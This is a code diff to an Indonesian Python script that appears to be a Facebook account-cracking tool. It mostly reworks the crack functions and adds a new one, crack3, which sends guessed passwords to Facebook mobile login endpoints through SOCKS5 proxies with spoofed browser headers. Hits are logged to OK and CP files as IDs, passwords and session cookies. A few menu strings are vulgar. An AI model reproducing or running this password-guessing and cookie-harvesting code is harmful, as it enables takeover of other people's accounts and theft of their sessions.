@@ -232,8 +232,8 @@ def menu():
 		banner()
 		print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
 	print(nel(f"\t\t         [bold blue]Info Tumbal",style=f"bold purple"))
-	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] User Tumbal :{H2}{nama}")
-	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] ID Tumbal :{B2}{id}")
+	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] User Tumbal:{H2}{nama}")
+	print(f"  {H2}╰─▶{B2} ✶ [bold yellow] ID Tumbal:{B2}{id}")
 #--------------------[ USER ]--------------#
 import requests
 from datetime import datetime
@@ -890,13 +890,13 @@ def setting():
 	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]')
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
-		method.append('metod2')
-	elif hc in ['2','02']:
-		method.append('metod3')
-	elif hc in ['3','03']:
 		method.append('metod1')
-	else:
+	elif hc in ['2','02']:
+		method.append('metod2')
+	elif hc in ['3','03']:
 		method.append('metod3')
+	else:
+		method.append('metod1')
 	prints(nel(f'                        [bold blue]Manual Password?', style=f"bold purple")) 
 	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
 	if pwplus in ['y','Y']:
@@ -908,16 +908,6 @@ def setting():
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
-	print("")
-	prints(nel(f'                        [bold blue]Aplikasi Terkait?', style=f"bold purple"))
-	_jembot_ = input('✶ ━━⫸ Tambahkan Aplikasi Terkait ( Y/t ) ')
-	if _jembot_ in ['']:
-		print(' [red]Pilih Yang Bener Kontol ')
-		back()
-	elif _jembot_ in ['y','ya','Ya','Y']:
-		taplikasi.append('ya')
-	else:
-		taplikasi.append('no')
 	print("")
 	prints(nel(f'                        [bold blue]Pilih Prabowo?', style=f"bold purple"))
 	tai = input('✶ ━━⫸  Saya Janji Akan Pilih Prabowo ( Y/t ) ')
@@ -935,8 +925,8 @@ def passwrd():
 	loading()
 	clear()
 	banner()
-	print(nel(f'                {M}!{H} PROSES CRACK SEDANG BERLANGSUNG{N}{M} !', style=f"bold purple"))
-	print(nel(f'               {M}!{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N}{M} !', style=f"bold purple"))
+	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !', style=f"bold purple"))
+	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !', style=f"bold purple"))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -966,15 +956,13 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'metod1' in method:
-				pool.submit(validate1,idf,pwv)
+				pool.submit(crack,idf,pwv)
 			elif 'metod2' in method:
-				pool.submit(validate3,idf,pwv)
+				pool.submit(crack2,idf,pwv)
 			elif 'metod3' in method:
-				pool.submit(kontol,idf,pwv)
-			elif 'metod4' in method:
-				pool.submit(reguler1,idf,pwv)
+				pool.submit(crack3,idf,pwv)
 			else:
-				pool.submit(kontol,idf,pwv)
+				pool.submit(crack,idf,pwv)
 				
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
@@ -1544,10 +1532,10 @@ def kontol(idf,pwv):
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
-	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
+	prog.update(des,description=f"{asu}RR07{x} [{loop}]/{len(id)} \n[bold green]OK-:[bold green]{ok} \n[bold yellow]CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
@@ -1578,14 +1566,14 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──>  TAHUN : {B2}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
+				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ RR07 CP ]",style=f"bold yellow"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──>  TAHUN : {H2}{thnb}{N}\n└──>  KUKIS : {H2}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {B2}{cka}{N}')
+				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nCOOKIES : {kuki}",title=f"[bold green][ RR07 OK ]",style=f"bold green"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1598,8 +1586,6 @@ def crack2(idf,pwv):
 	pers = loop*100/len(id2)
 	fff = '%'
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07{P}] |{P}{asu}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
-	sys.stdout.flush()
 	bro = random.choice(["com.google.android.captiveportallogin","com.chrome.beta","com.kiwibrowser.browser","org.gnu.icecat","com.cookiegames.smartcookie","com.facebook.lite","com.instagram.barcelona","com.instagram.boomerang","com.mx.browser","com.opera.browser"])
 	ua = random.choice(ugen)
 	get = geturlm()
@@ -1607,6 +1593,8 @@ def crack2(idf,pwv):
 	post = posturlm()
 	ua = random.choice(ugen)
 	ses = requests.Session()
+	prog.update(des,description=f"{asu}RR07{x} [{loop}]/{len(id)} \n[bold green]OK-:[bold green]{ok} \n[bold yellow]CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
 	for pw in pwv:
 		try:
 			link = ses.get(get)
@@ -1669,7 +1657,7 @@ def crack2(idf,pwv):
 }
 			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H}{pw}{N}\n└──> TAHUN : {H2}{thnb}{N}\n└──> UGENT : {U}{ua}{N}')
+				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ RR07 CP ]",style=f"bold yellow"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1678,9 +1666,76 @@ def crack2(idf,pwv):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				print(f'\r├──> ID  : {B2}{idf}{N} | PW  : {H2}{pw}{N}\n└──> TAHUN : {B2}{thnb}{N}\n└──>  KUKIS : {H2}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {B2}{cka}{N}')
+				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nCOOKIES : {kuki}",title=f"[bold green][ RR07 OK ]",style=f"bold green"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+#------------------[ METHODE-LOGIN ]-----------------#
+def crack3(idf,pwv):
+	global loop,ok,cp
+	rr = random.randint
+	rc = random.choice
+	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	prog.update(des,description=f"{asu}RR07{x} [{loop}]/{len(id)} \n[bold green]OK-:[bold green]{ok} \n[bold yellow]CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			p = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1707187347074%26e2e%3D%257B%2522init%2522%253A1707187347074%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D8adcf810-66b9-4a47-8055-6acc3cd70b14%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b989d7bc-d0c5-4290-8e28-ec465e298a32%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vrdiaf3fhk0in2shjc3n%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DpyZMKnt961lJ_Qrt6uzlsD9nFvGFulyah8cA_lFJHlc%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db989d7bc-d0c5-4290-8e28-ec465e298a32%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b989d7bc-d0c5-4290-8e28-ec465e298a32%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vrdiaf3fhk0in2shjc3n%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			dataa = {'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			heade={
+			"Host": "m.prod.facebook.com",
+			"content-length": "{str(rr(1000,3000))}",
+			"sec-ch-ua": '"Chromium";v="{str(rr(100,200))}", "Google Chrome";v="{str(rr(100,200))}", "Not;A=Brand";v="{str(rr(1,9))}"',
+			"dnt": "{str(rr(1,9))}",
+			"sec-ch-ua-mobile": "?1",
+			"user-agent": ua,
+			"viewport-width": "{str(rr(300,500))}",
+			"content-type": "application/x-www-form-urlencoded",
+			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
+			"sec-ch-ua-platform-version": "{str(rr(11,20))}.0.0",
+			"x-asbd-id": "{str(rr(129000,129500))}",
+			"dpr": "1.6",
+			"sec-ch-ua-full-version-list": '"Not;A=Brand";v="{str(rr(1,9))}.0.0.0", "Chromium";v="{str(rr(100,200))}.0.{str(rr(6000,7000))}.{str(rr(10,50))}", "Google Chrome";v="{str(rr(100,200))}.0.{str(rr(6000,7000))}.{str(rr(10,50))}"',
+			"sec-ch-prefers-color-scheme": "light",
+			"sec-ch-ua-platform": "Android",
+			"accept": "*/*",
+			"origin": "https://m.prod.facebook.com",
+			"sec-fetch-site": "same-origin",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-dest": "empty",
+			"referer": "https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1707187347074%26e2e%3D%257B%2522init%2522%253A1707187347074%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D8adcf810-66b9-4a47-8055-6acc3cd70b14%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b989d7bc-d0c5-4290-8e28-ec465e298a32%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vrdiaf3fhk0in2shjc3n%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DpyZMKnt961lJ_Qrt6uzlsD9nFvGFulyah8cA_lFJHlc%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db989d7bc-d0c5-4290-8e28-ec465e298a32%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b989d7bc-d0c5-4290-8e28-ec465e298a32%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vrdiaf3fhk0in2shjc3n%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+			"accept-encoding": "gzip, deflate br",
+			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+			}
+			po = ses.post('https://m.prod.facebook.com/login/device-based/login/async/?api_key=401339800076611&auth_token=9d3fdbb945973fb43c8994fecc738515&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D401339800076611%26cbt%3D1704723163561%26e2e%3D%257B%2522init%2522%253A1704723163561%257D%26ies%3D1%26sdk%3Dandroid-12.0.0%26sso%3Dchrome_custom_tab%26nonce%3D5ae1affd-3fb9-455b-a169-b97d1d2d4473%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252217170814-d620-4efa-a606-6476725d55f3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mpb23u7ii5duc59mofsp%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ruangguru.livestudents%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D17170814-d620-4efa-a606-6476725d55f3%26tp%3Dunspecified&refsrc=deprecated&app_id=401339800076611&cancel=fbconnect%3A%2F%2Fcct.com.ruangguru.livestudents%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252217170814-d620-4efa-a606-6476725d55f3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522mpb23u7ii5duc59mofsp%2522%257D&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				tree = Tree(f" ")
+				prints(panel(f"[bold yellow]ID : {idf} \nPASSWORD : {pw} \nUA : {ua}",title=f"[bold yellow][ RR07 CP ]",style=f"bold yellow"))
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f"  ")
+				prints(panel(f"[bold green]ID : {idf} \nPASSWORD : {pw} \nCOOKIES : {kuki}",title=f"[bold green][ RR07 OK ]",style=f"bold green"))
+				cetak(tree) 
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cek_apk(kuki)
+				break
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
